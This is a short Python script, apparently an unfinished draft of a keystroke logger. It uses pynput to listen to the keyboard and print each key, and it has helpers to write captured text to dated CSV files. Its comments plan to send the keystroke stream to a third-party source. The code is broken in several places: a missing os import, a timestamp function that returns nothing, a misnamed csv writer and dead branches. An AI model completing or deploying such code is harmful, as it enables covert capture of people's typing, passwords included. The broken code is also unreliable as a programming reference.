from asyncore import loop
from logging.config import listen
from tracemalloc import start
from pynput.keyboard import Key, Listener
from datetime import datetime
import csv
import random

# Thought process:
  
#  - start in loop
#  - listen
#  - listen for break characters (" ", "." "ººª/tab/" )
#  - move data/stream to a third party source for record keeping
#  - connect data services to data store for analysis

data = []

def time_stamp():
  now = datetime.now()
  dt_string = now.strftime("%d/%m/%Y")

def random_directory():
  directories = [row[0] for row in os.walk(os.path.expanduser('~/dev'))]
  chosen_directory = random.choice(directories)
  
def write(blob):
  ts = time_stamp()
  
  with open("data/" + ts + ".csv", 'w') as f:
    write = csv.writer(f)
    writer.writerow(['text'])
    writer.writerow([blob])

def on_press(key):
  print(key)
  pressed_string = ("{0} pressed".format(key))
  print(pressed_string)
  
def on_release(key):
  # if key == Key.ctrl_c:
  #   next
  try:
    if key == Key.space:
      next
    if key == Key.tab:
      next
    if key == Key.esc:
      return False

  except KeyboardInterrupt:
    print('interupt happened')
    
  
  
  
with Listener(on_press=on_press, on_release=on_release) as listener:
  listener.join()
